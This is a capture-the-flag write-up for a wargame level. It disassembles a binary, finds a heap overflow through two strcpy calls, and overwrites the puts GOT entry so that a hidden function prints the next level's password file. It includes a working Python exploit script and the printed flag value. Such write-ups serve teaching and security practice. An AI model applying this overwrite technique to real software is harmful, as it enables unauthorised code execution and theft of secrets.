
# Level7

First step - testing the program
```
$ ./level7
Segmentation fault (core dumped)
$ ./level7 Hello
Segmentation fault (core dumped)
$ ./level7 Hello world
~~
$ ./level7 Hello literaly everybody
~~
```

Start in GDB
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048521 <+0>:		push   ebp
   0x08048522 <+1>:		mov    ebp,esp
   0x08048524 <+3>:		and    esp,0xfffffff0
   0x08048527 <+6>:		sub    esp,0x20
   0x0804852a <+9>:		mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
```


See the `fopen` parameters

```
0x080485c2 <+161>:	mov    edx,0x80486e9
0x080485c7 <+166>:	mov    eax,0x80486eb
0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>

(gdb-peda)$ x/s 0x80486e9
0x80486e9:	"r"
(gdb-peda)$ x/s 0x80486eb
0x80486eb:	"/home/user/level8/.pass"
```

It's an open on the file we need

List all the functions

```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf@plt
0x080483c0  fgets@plt
0x080483d0  time@plt
0x080483e0  strcpy@plt
0x080483f0  malloc@plt
0x08048400  puts@plt
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main@plt
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```
There is a non-called `m` function
```
(gdb-peda)$ disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:		push   ebp
   0x080484f5 <+1>:		mov    ebp,esp
   0x080484f7 <+3>:		sub    esp,0x18
   0x080484fa <+6>:		mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
```

--- 

Printf the time and a global variable *0x8049960*, the name is `c`

`fgets` put the result of the `fopen` on a global string `c`, the same of the printf

We need to read this global variable by calling the function `m`

We can overwrite the puts call by `m` in the GOT using the strcpy overflow

So, we can use the first call to strcpy for overwrite paramaters of the second strcpy call and replace the put GOT address with *m* address


First, we need to find the offset :
```
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'

Guessed arguments:
arg[0]: 0x41412d41 ('A-AA')
arg[1]: 0x0

gdb-peda$ pattern offset A-AA
A-AA found at offset: 20
```

We need *m* address :
```
$ objdump -t level7
080484f4 g     F .text	0000002d              m
```

And *puts* address :
```
$ objdump -R level7
08049928 R_386_JUMP_SLOT   puts
```


Ok, we can now start exploit

```
#!/usr/bin/python

import struct

FT_M = 0x80484f4
PLT_PUTS = 0x8049928

PAD = "A" *20

AV1 = PAD
AV1 += struct.pack("I", PLT_PUTS)

AV2 = struct.pack("I", FT_M)

print AV1 AV2
```

```
$ ./level7 `./exploit.py`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```



